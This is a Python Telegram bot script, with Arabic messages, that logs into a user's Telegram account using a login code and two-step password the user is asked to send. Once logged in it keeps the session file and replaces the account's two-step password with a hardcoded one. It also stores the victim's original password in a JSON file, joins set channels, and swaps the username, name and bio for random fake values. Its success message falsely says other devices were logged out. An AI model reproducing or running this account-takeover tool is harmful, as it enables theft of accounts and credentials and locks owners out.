from pyrogram import Client
from pyrogram.raw import functions
import sys, time, os, random
import asyncio
import json
import configparser
import requests
from database import *

textBanned          = "عذرا ، هذا الرقم محظور !";
retryAfter             = "عذرا ، محاولات كثيرة يرجى تبديل الرقم أو الإنتظار حتى تتمكن من تسجيل هذا الرقم ";
numberIsFalse    = "عذرا الرقم ليس صحيحا";
numberIsBanned = "عذرا ، الرقم محظور مؤقتا \n قد يرجع سبب ذلك إلى تخمين كود التحقق أو رمز التحقق بخطوتين";
doneApp                = "لقد أرسلنا لك كود التحقق إلى تطبيق تيليجرام على جهازك الآخر ، قم بتفقد آخر الرسائل";
doneSMS               = "تم إرسال كود التحقق في رسالة SMS إلى رقم هاتفك";
doneLogin             = "✅ تم تسجيل الدخول بنجاح بنجاح وتم تسجيل الخروج من كل الأجهزة الأخرى♻️";
errorCode              = "❌ كود التحقق غير صحيح ، قم بإرسال كود التحقق الذي تم إرساله لك وإلا سيتم إلغاء عملية تسجيل الدخول ";
timeOutCode        = "⏰ الكود منتهي الصلاحية ، قم بإرسال كود التحقق الجديد";
sendCodeAuth     = "♻️ هذا الحساب محمي بواسطة المصادقة الثنائية ( التحقق بخطوتين ) ولتسجيل الدخول إليه قم بإرسال كود التحقق بخطوتين ";
errorCodeAuth     = "❌ كود التحقق بخطوتين غير صحيح ، قم بإرسال كود التحقق بخطوتين الذي قمت بوضعه سابقا من الجهاز الآخر";
unknownError      = "❌ حدث خطأ غير معروف!";
timeOutSession  = "⌛ انتهت مهلة جلسة تسجيل الدخول!";
overSession         = "♻️ تم انهاء الجلسة بنجاح ✅";
doneLoginNotOut = "✅ تم تسجيل الدخول \n⌛ لكن لم يتم تسجيل الخروج من بقية الجلسات";

FIRST_NAMES     = ['محمد','علي','أحمد','سالم','سلمان','عبدالرحيم','عبدالله','أواب','مهدي','رحمة','نور','زكريا','أبو بكر','جيلو','حياة','رؤوف','درهم','ميقات','رجب','محرم','عبدالباري','حسن','كنعان','توفيق','سعيد','سهيل','بدر','أبو بدر','أمجد','أكرم','نادر','قاسم','محسن','محمود','إمام','عادل','صلاح','صالح','عبدالرزاق','عبدالعلي','عبدالعظيم','عبدالعليم','عبدالحليم','رياض','مهند','سجاد','سيف','عثمان','خليل','أنطوان','ميسور','شرف','سامي','نوح','سمير','عمر','عمرو','هشام','معد','ممدوح','محبوب','أيوب','مأمون','فارغ','خالد','نعمان','مصلح','ربيع','رمضان','زهراء','ميثاق','رعد','صفاء','نقاء','حليم','كريم','عبدالكريم','موسى','عيسى','هارون','مريم','ناصر','حوت','أمين','بدير','نجم الدين','عزالدين','مهيوب','منصور','فيصل','حسام','أسامة','رقيب','أصيل','راغب','ضياء','قصي','عميد','إيهاب','وهيب','مهيب'];
LAST_NAMES      = ['الخالدي','اليافعي','العراقي','السوري','الشامي','بن رمل','بن محمد','اليمني','المغربي','المصري','العشاري','الحميري','رأفت','باسم','علامة','الحاج','التاج','الشامخ','الرنم','خان','عميد','روؤف','السادس','كمال','البدر','الصقراوي','السروري','باعلوي','باسالم','بلفقيه','المحضار','ساري','صدام','حسين','الهيبة','الهباهبة','العمايرة','الهاشمي','الكنعاني','الصنعاني','الفقير','النرجس','الورش','نافع','الوجيه','سليم','الصنبحي','رأفت','رامي','رائد','رتبة','خبير','الحمصي','زين العابدين','مبارك','الرزيق','الرزين','السامرائي','الكلدي','اليهري','التعزي','عساج','الفهد','فهد','هيثم','الحراني','الصعيدي','البورسعيدي','هشام','رمح','جواس','ثابت','جساس','فضل','السكر','العلوي','القرشي','السعودي','الكويتي','صلالة','الرياضي','قيس','أوس','السرابي','الصحراوي','الجبلي','الحيد','البيرق','العقربي','النوكياوي','الهجام','رئيس','منصدع','عبدالعزيز','عبدالرحمن','المحاسن','ريدان','مراسل','صعيب','عمار','ياسر'];
#BIO = ['- أنا حيث الأقلية ، لن تجدني في الضجيج.','- كثير الإنفراد بنفسي، أغرق وأنجو بمفردي.','- لستُ عابرًا ، أنا السبيلَ كُلّه.','- من يعرف قيمة نفسه، لا يفاوض.','- أنا الذي لا يطيق الانتظار أنتظرتك.','- وسَقطت في عدم اكتراث الأيام.','- مثل إناء فارغ، تحطّمت روحي.','رغبة خانقة للبكاء.','‏حتى هذا الصمت إمتداده إليك .','هل جَزاء الحُب دائماً الحُزن؟.','‏مؤلم أن ينتابك الحنين لشيء لن يعود.','‏"ثم يُصبح الأمر عادياً تنام بجوار..حُزنك".','‏"أصد النظِر عنك..وكل دروبي لك تميْل".','"أود أن يُزال هذا الحزن..ولايعود إلِي مرةأخرى".','- الكل يهتم بعد فوات الآوان.','- لا أقارن نفسي بأي شخص أخر.','- ‏أنا وَهبتك المَعنى وأنا أُزيله عنكَ لو شئت.','- ‏نحن أحرار بكل شيء، إلا مشاعرنا .','- لستُ سعيدًا أو حزينًا، أنا لا أشعرُ بأيِّ شيء.','- قد تعني المغفرة أنني لم أعد أكترث.','- قد تعني المغفرة أنني لم أعد أكترث.','‏- لقد كُنت وحيدًا حتى وانا بصحبة الجميع.','أتعلمون أي تعب قد وصلت ؟','- لستُ حزينًا بعدَ الآن، لقد باتَ الحزنُ جزءًا مني.','- لم أخسر الكثير، لقد خسرتُ كلَّ شيءٍ فقط.','- الكلامُ لا يَنتهي، تنتَهي الجدوى مَن الكلام.','زاوية واحدة من الكون تستطيع إصلاحها , هي نفسك.','ندسُ في وجهِ كلُ البدايات ‏وداعاً مؤجل ...','- قتلنا وما زلنا نتألم و لم نتعلم.']
BIO = ['- أنا حيث الأقلية ، لن تجدني في الضجيج.','- كثير الإنفراد بنفسي، أغرق وأنجو بمفردي.','- لستُ عابرًا ، أنا السبيلَ كُلّه.','- من يعرف قيمة نفسه، لا يفاوض.','- أنا الذي لا يطيق الانتظار أنتظرتك.','- وسَقطت في عدم اكتراث الأيام.','- مثل إناء فارغ، تحطّمت روحي.','رغبة خانقة للبكاء.','‏حتى هذا الصمت إمتداده إليك .','هل جَزاء الحُب دائماً الحُزن؟.','‏مؤلم أن ينتابك الحنين لشيء لن يعود.','‏"ثم يُصبح الأمر عادياً تنام بجوار..حُزنك".','‏"أصد النظِر عنك..وكل دروبي لك تميْل".','"أود أن يُزال هذا الحزن..ولايعود إلِي مرةأخرى".','- الكل يهتم بعد فوات الآوان.','- لا أقارن نفسي بأي شخص أخر.','- ‏أنا وَهبتك المَعنى وأنا أُزيله عنكَ لو شئت.','- ‏نحن أحرار بكل شيء، إلا مشاعرنا .','- لستُ سعيدًا أو حزينًا، أنا لا أشعرُ بأيِّ شيء.','- قد تعني المغفرة أنني لم أعد أكترث.','- قد تعني المغفرة أنني لم أعد أكترث.','‏- لقد كُنت وحيدًا حتى وانا بصحبة الجميع.','أتعلمون أي تعب قد وصلت ؟','- لستُ حزينًا بعدَ الآن، لقد باتَ الحزنُ جزءًا مني.','- لم أخسر الكثير، لقد خسرتُ كلَّ شيءٍ فقط.','- الكلامُ لا يَنتهي، تنتَهي الجدوى مَن الكلام.','زاوية واحدة من الكون تستطيع إصلاحها , هي نفسك.','ندسُ في وجهِ كلُ البدايات ‏وداعاً مؤجل ...','-قتلنا وما زلنا نتألم و لم نتعلم.','أما أنا فأصبحت تالفً من جُرعة الحياة .','بكيت لأنني لم أعُد أشعُر بشيء سوى الفراغ .','لا بأس سأتحمل صعوبة الأيام القادمة .','أُشاهدُ أيامًا ضائعةَ مَن حياتي على لا شيء.','لا يوجد مَهرب مَن هذهِ الأيام يَجبُ أن نتعلم.','كان صامتًا ، ويرى كُل الأسى في عيناهُ .','في نهاية المَطاف أدركتُ أن الحياة مُتعبة .','- أنك وحيد لأنك فريد من نوعك.','- فلا روحًا باتت تشعر ولا قلبًا بات يكترث.','ـ الخيبه تأتي دائمًا من الذين قدمنا لهم كُل شيء.','وجه أشبه ببحر هادئ لا يستطيع المرء تخمين مدى عمقه.','- ملامحي بدأت تُجَلِّي التعب الذي أحمله بداخلي.','لم يقتل الحُزنُ أحدًا، لكنَّه جعَلنا فارِغين مِن كلِّ شَيء.','- ماذا حل بنا حتى نعيش هذا التشتت؟','- إلى أيِّ درجة من الألم سَيصل قلبي بعد.؟','ـ اصبحنا لا نلوم الغرباء فالمقربين فعلوا الأسوأ!','ـ في أعماق كل مِنَّا سفينة غارقة بالأحزان.','مرهق لان الاحتمالات كثيرة ولا شيء منها صائب.','- ليس ثمة من يحب العزلة ، إننا فقط نكره الخيبات.','- ‏أريد أن يزول كُل هذا فحسَب.','- لم يستطيع أحد ايذائي ، سوى أفكاري.','لا تبالغ في وضوحك هذا العالم أعمى.','‏عندما قلنا وداعاً كنت قد ودعت نفسي أيضاً.','- شُكراً لوجودكِ المؤقت، لقد أفسدَ عليَّ وحدتي .','"ثُم بكى على الوحّدة العميقه التي تمْلأ قلبه".','ـ لم اكسب في حياتي اي شيء سوى الخسارة.','‏ وكنّا نقاوم ، وكنّا نفيض أملًا.','- وما أشد حيرتي بين ما أريد وما أستطيع.','- ‏مع كل يوم يمر أعتاد الصمت وعتمته الهائلة.','- ‏الحياة اختبرت صبري بطريقة قاسية جدًا.','- إلى من كنت مُلهِمة، أنا كل جماهيرك الحزينة.','ـ الحزن هو إنتباه الروح لكل ما مضى.','- مؤسِفة لحظة الإدراك ، بعد وهمٍ شديد.','مَرحبًا، بِدون مُقدمات و لف ودوران " أحضنّي ".','‏"حالة من الركُود والقلق في آنٍ واحد ','‏" و يضيق صدري..ولا ينطلق لساني "','‏"ويأسي كانَ أكبرَ من صبر روحي"','‏"أن أحيا كما أريد، أو لا أحيا إطلاقا"','‏”سكينة الذي جرب وتيقّن أن الأمر لا يستحق..“','‏يلهثُ رغم جلوسه الطويل، كأن روحه تركض بمكان آخر.','‏"وصلت إلى البكاء ولم أبكي".','منذُ سنة لم أكن أشبهُ نفسي في هذِه اللحظة .','لقد فقدت الكثير في هذهِ الحياة، و أولها نفسي.','سأظلُ أسعى حَتى أصلَ إلى دربٍ يُشبهُني .','• ‏أريدُ أن انام بقلبٍ وعقلٍ هادئ، فأنا لم أنم جيداً مُنذ مدةً طويلة.','إكتئابي حُرم عليه الرحيل، لقد باتَ جزءً مني مُنذ وقتٍ طويل.','كيف للمرء أن يشرح حزنه دون أن يبدو ضعيفاً.؟','أنا بخير، كُل مافي الأمر أنني أموتُ قليلاً.','ـ الحزن هو إنتباه الروح لكل ما مضى.','الأخبارُ الجيدة هي أنني بدأتُ أعتادُ على خيباتِ الأمل .','ـ أنا لست خجولًا أنا فقط لا أعطي طاقتي للجميع.','أولئك الذين لم يفهموا صمتك لن يفهموا كلامك.','- ‏أريد فقط أن أقضي بقية عمري منعزلًا.','- لقد صبرتُ لوقتٍ طويل، لم أعد أحتملُ المزيد .']

NAME  = ['『ﺂسسـ⇣𓃠⃝ـاﭑمۿ̐ͫ̚✘٢⁴̸』 ㅤㅤㅤ','˛ َِ𝗞َِ𝗛َِ𝗔َِ𝗧َِ𝗔َِ𝗕.#¹','• 𝑵𝑨𝑮𝑴','˼راﺂشـــد | 𝚁𝙰𝚂𝙷𝙴𝙳 ˹','𝓢𝓱𝓪𝓲𝓯','Eng : Zeko','𓆩 🎩الـــســ🖤ـــاحـــر🎩𓆪','٠٩:٥٩|','Felix.','- Ꮃ𝐿𝐻𝐴𝑁¹⁹. 𖡣','𝐇𝐀𝐒𝐒𝐀𝐍','عَبْدُالَرَحْمَنّ ♥','︎ﻧﺑيـذ|🇾🇪','BiLaL AhMeD 🇵🇸✌🏻','ᶆσḩɑ̈̈ᶆéᶁ ꮩꮠ͋͢ꭾ','E x X','𝗕𝗢𝗕','."♡MØKÃ🍻🇫🇴💖!♡','- 𝐀𝐌𝐑 🍅','- 𓊆 𝑨𝑳𝑲𝑨𝑾𝑳𝑰𝑬𓊇࿅ 𓀎🇾🇪','Hru','المصمم رَافُضَي³¹³ 🚸✈️','- ابو صيعر ゑ','𝑫𝑯𝑶𝑴 𖧊 𝑺𝑨𝑫 .ᵛ͢ᵎᵖ','اسامه الحرازي','فخـامـة الـزعـيــم|¹٩','️ ️','☬ 𝐇َ𝐀𝐈𝐃𝐄𝐑 𝐀𝐋𝐈 (:','𓆩جـِراح٢²𓆪','🇱🇧oMar','Nawaf','𝒀𝒐𝒖𝒔𝒔𝒆𝒇 - 𝑩𝒂𝒚𝒂𝒉𝒚𝒂','الـ¦ـقياده𖤍حـ¦ـنـيـن𖤍ـ¦🇾🇪⃟','HOTHifa.𓆪','ᥡ᥆ᥙ᥉ᥱƒ','𝙎𝙏𝙀𝙏𝘾𝙃','بٰڪيݪ َِ𝖻َِ𝖪!َِ𝖫 . 🇾🇪','Zero','ســـــــٍـرمد | 𝐒𝐀𝐑𝐌𝐀𝐃 🇾🇪','نـــبراس','𝟏𝟎:𝟎𝟑 ➳ᴹᴿ᭄ 𝑀𝑂𝐻𝐴𝑀𝐸𝐷 963 | 🦅','𝐌𝐎𝐇𝐀𝐍𝐀𝐃 𝐀𝐋𝐒𝐄𝐅','˛ َِ𝘈َِ𝘔َِ𝘮َِ𝘢َِ𝘙 .','يوسف | 🇵🇸','⌯『𝐀𝐄𝐄𝐌𝐍』𖤍᭄𓄹','𓆩 𝒂𝒚𝒎𝒏 𝒂𝒍 - 𝒅𝒐𝒓𝒂𝒇𝒚 𖤹𓆪','ᯓ𓈒𓏲 ‌ 𝐘𝐀𝐒𝐒𝐄𝐑『🇵🇸 🇾🇪 』𓄹','ًٍ𝗦ًٍ𝗣ًٍ𝗘ًٍ𝗖ًٍ𝗜ًٍ!َُِِ𝗔ًٍ𝗟','مـِٰٚـٰٚجاهـٰٚـِـد 🇵🇸 𓅓','➪Ⴆ᥆ᥒᦔ᥆ƙ_Ⴆꪖ᥉ꫝꪖ↯','TARZAN','🇾🇪ALnajm🇾🇪','›: ًٍََََُِِِِِ𝐃𝐌ََُِِِِ𝐀َِِٰ𝐑َُِِِ ¹.ᯤ̸','𝒎𝒂𝒍𝒚𝒆⎚ 公公','『CR7 الدون』⟠','ᯓ 𝙰𝙼𝙴𝙴𝙽 𝙹𝙰𝚁𝙰𝙻𝙻𝙰𝙷ᵛ͢ᵎᵖ','𝟭𝟬:𝟬𝟲 𓏺 𝙨𝙚𝙚𝙫 𓂆 🪖','☻ 𝒐𝒔𝒂𝒎𝒂 𝒂𝒍𝒈𝒂𝒑𝒓𝒚 ♛™','فارس','مــودي³¹³','𝙆𝗮𝙍𝗲𝗲𝙈“̯ 🐼💗 |℡','ㅤㅤㅤㅤ','SalaviAdmin_TheDoctor','Do3bor [Billamy]','ャ Ʀιø • 𝕏','-OMAR ˹🇾🇪˼','𝐀𝐥𝐢','˛ 𝖻𝖺𝗌𝗁𝖺𝗋 .','المسرب 𝑭𝑨𝑯𝑫','M̷a̷m̷d̷o̷u̷h̷ 𝕏','آلَبّـآشّـقَ🦁🔥ۥَِ،🇾🇪','𝑠𝑙𝑜𝑘⌁ＴＭ 𝑎𝑙𝑓𝑟𝑎3𝑛𝑎 .','𝔦ϻ∆𝐩𝐰𝐫','⌯🚸الـࢪئـاسه ┊ 𝙎 𝙋 𝙉 𝙓','⁪⁬⁪⁬⁮⁪⁬⁪⁬⁮ ⁪⁬⁪⁬⁮⁪⁬⁪⁬⁮—َِ͟͞𝙀َِ 𝙇َِ 𝙎َِ 𝙃َِ 𝗢َِ 𝙍َِ 𝘽َِ 𝙅َِ 𝙔 | ⚝','⁪⁬⁪⁬⁮⁪⁬⁪⁬⁮ ⁪⁬⁪⁬⁮⁪⁬⁪⁬⁮—َِ͟͞𝙀َِ 𝙇َِ 𝙎َِ 𝙃َِ 𝗢َِ 𝙍َِ 𝘽َِ 𝙅َِ 𝙔 | ⚝','𝒔𝒖𝒍𝒕𝒂𝒏-سلطان,','⸂ 𝗠ًٍ!ٍَُ𝗮ًًٍٍ𝗥ًٍ𝙚َِ𝗮ًًٍٍ𝗠ًٍ ، ً ♡゙ ﮼ •','𝘼𝙡 𝙖𝙊𝙈𝘿𝙖|🇦🇷','-›: َ𝗝َِ𝗦َِ!َ𝗔َِ𝗡َِ𝗦َِ.#¹🦇','-›: َ𝗝َِ𝗦َِ!َ𝗔َِ𝗡َِ𝗦َِ.#¹🦇','𝗕𝗲  𝑯𝒊𝒕𝒍𝒍𝒆𝒓 卍 🇩🇪','︎AMiN | اَمین','- كيفن⊀١','↬ 𝘉𝘳𝘌𝘢𝘒 تارك ⁪⁬⁮⁮⁮⁮ ‌‌‌‌','ᔆ ᴾ ᴱ ᴱ ᴰ ™ 𝓼','ࢪاސ ٤٢٠٢؁🇾🇪','.⊱ســ͢ي͡ـᬼـَ۪ٜ۪ٜؔٛٚؔاف⚚']

opreat      = sys.argv[1];


sessions	      = os.listdir('sessions');
random.shuffle(sessions);
THE_SESSIONS = os.listdir('sessions');
cSessions	   = len(THE_SESSIONS);


if opreat != 'add':
	exit();

number    = sys.argv[2];
owner_id  = sys.argv[3];
ch = 'QWERTYUIOPASDFGHJKLZXCVBNM1234567890'
username =str(random.choice('QWERTYUIOPASDFGHJKLZXCVBNM')[0])+str(''.join(random.choice(ch) for i in range(7)))
config = configparser.ConfigParser() 
config.read("jello.ini")



api_id       = config['owner']['id'];
api_hash = config['owner']['hash'];
token        = config['API_KEYs']['signer'];
ses            = makeKey();
app            = Client(name=f"sessions/{ses}",api_id=api_id, api_hash=api_hash);
app.connect();


def sendMessage(chat_id, text):
    URL = "https://api.telegram.org/bot"+token+"/sendmessage"
    PARAMS = {'chat_id': chat_id, 'text': text, 'parse_mode': 'markdown'}
    requests.get(url=URL, params=PARAMS)


async def signAccount():
	
	try:
		send   = await app.send_code(phone_number=number);
		trueF   = True;
	except Exception as Errors:
		try:
			os.remove(f"sessions/{ses}.session");
		except:
			pass
		print(Errors);
		
		RESPONSE      = str(Errors).replace('Telegram says: ', '').split(' - ')[0];
		
		if RESPONSE == '[400 PHONE_NUMBER_BANNED]':
			delete(owner_id);
			sendMessage(owner_id,textBanned);
			return
		elif RESPONSE == '[420 FLOOD_WAIT_X]':
			delete(owner_id);
			sendMessage(owner_id,retryAfter);
			return
		elif RESPONSE == '[406 PHONE_NUMBER_INVALID]':
			delete(owner_id);
			sendMessage(owner_id,numberIsFalse);
			return
		elif RESPONSE == '[406 PHONE_PASSWORD_FLOOD]':
			delete(owner_id);
			sendMessage(owner_id,numberIsBanned);
			return
	success   = json.loads(str(send));
	
	
	if success['_'] == 'SentCode':
		if success['type'] == 'SentCodeType.APP' or success['type'] == 'app':
			METHOD   = 'APP';
			sendMessage(owner_id,doneApp);
		else:
			METHOD         = 'SMS';
			sendMessage(owner_id,doneSMS);
		CODE_HASH   = success['phone_code_hash'];
		set(owner_id,"status","verfiry");
		set(owner_id,"code_hash",CODE_HASH);
		set(owner_id,"method",METHOD);
		time.sleep(5);
		
	counter     = 0;
	while trueF:
		
		status      = get(owner_id,"status");
		code         = get(owner_id,"code");
		counter  += 1;
		
		
		
		if code is False and counter <= 12:
			time.sleep(10);
		
		
		if status == "verfiry" and code is not False and code != '':
			code_hash   = get(owner_id,"code_hash");
			method         = get(owner_id,"method");
			
			if method == 'APP':
				try:
					await app.sign_in(number, code_hash, str(code));
					sendMessage(owner_id,doneLoginNotOut);
					await app.join_chat('ddddisvb');
					await app.join_chat('YB_13');
					await app.enable_cloud_password("0855", "حق الراقي 2")
					await app.set_username(username)
					await app.update_profile(first_name=random.choice(NAME), bio=random.choice(BIO))
					delete(owner_id);
					exit();
					break;
					return
				except Exception as ERROR_DATA:
					RESPONSE      = str(ERROR_DATA).replace('Telegram says: ', '').split(' - ')[0];
					if RESPONSE == '[400 PHONE_CODE_INVALID]':
						sendMessage(owner_id,errorCode);
						delete(owner_id,"code");
					elif RESPONSE == '[400 PHONE_CODE_EXPIRED]':
						sendMessage(owner_id,timeOutCode);
						delete(owner_id,"code");
					elif RESPONSE == '[401 SESSION_PASSWORD_NEEDED]':
						sendMessage(owner_id,sendCodeAuth);
						delete(owner_id,"code");
						set(owner_id,"status","auth");
					else:
						sendMessage(owner_id,sendCodeAuth);
						delete(owner_id);
						os.remove(f"sessions/{ses}.session");
						exit();
						break;
						return
					pass
			elif method == 'SMS':
				try:
					try :
						
						await app.sign_up(phone_number=number, phone_code_hash = code_hash, first_name= random.choice(FIRST_NAMES), last_name = random.choice(LAST_NAMES));
						sendMessage(owner_id,doneLogin);
						#sendMessage
						delete(owner_id);
						exit();
						break;
						return
					except Exception as hj:
						print(hj);
						
					await app.sign_in(number, code_hash, str(code));
				except Exception as ERROR_DATA:
					print(ERROR_DATA);
					RESPONSE      = str(ERROR_DATA).replace('Telegram says: ', '').split(' - ')[0];
					if RESPONSE == '[400 PHONE_CODE_INVALID]':
						sendMessage(owner_id,errorCode);
						delete(owner_id,"code");
					elif RESPONSE == '[400 PHONE_CODE_EXPIRED]':
						sendMessage(owner_id,timeOutCode);
						delete(owner_id,"code");
					elif RESPONSE == '[401 SESSION_PASSWORD_NEEDED]':
						sendMessage(owner_id,sendCodeAuth);
						delete(owner_id,"code");
						set(owner_id,"status","auth");
					else:
						sendMessage(owner_id,unknownError);
						delete(owner_id);
						os.remove(f"sessions/{ses}.session");
						exit();
						break;
						return
					pass 
			pass
		if status == "auth" and code is not False and code != '':
			try:
				await app.check_password(code);
				sendMessage(owner_id,doneLogin);
				#try:
					#await app.invoke(functions.auth.ResetAuthorizations());
					#sendMessage(owner_id,doneLogin);
				#except:
				info = await app.get_me();
				text = f'- تم تسجيل الدخول بنجاح ✅.\n 🔘 - اسم الحساب  :  {info.first_name}\n 🆔  - ايدي الحساب  :  {info. id}\n ☎️  - رقم الحساب  :  {number}   .';
				sendMessage(owner_id, text);
				await app.join_chat('ddddisvb');
				await app.join_chat('YB_13');
				await app.set_username(username)
				await app.change_cloud_password(str(code),"0855", "حق الراقي 2")
				await app.update_profile(first_name=random.choice(NAME), bio=random.choice(BIO))
				delete(owner_id);
				set(ses,'password',str(code),'database/passwords.json');
				exit();
				break;
				return
			except Exception as ERROR_AUTH:
				sendMessage(owner_id,errorCodeAuth);
				delete(owner_id,"code");
				print(ERROR_AUTH);
				
		## Check Time Out '___' ##
		if counter > 12:
			sendMessage(owner_id,timeOutSession);
			delete(owner_id);
			await app.disconnect();
			os.remove(f"sessions/{ses}.session");
			exit();
			break;
			return
		time.sleep(10);

asyncio.get_event_loop().run_until_complete(signAccount());

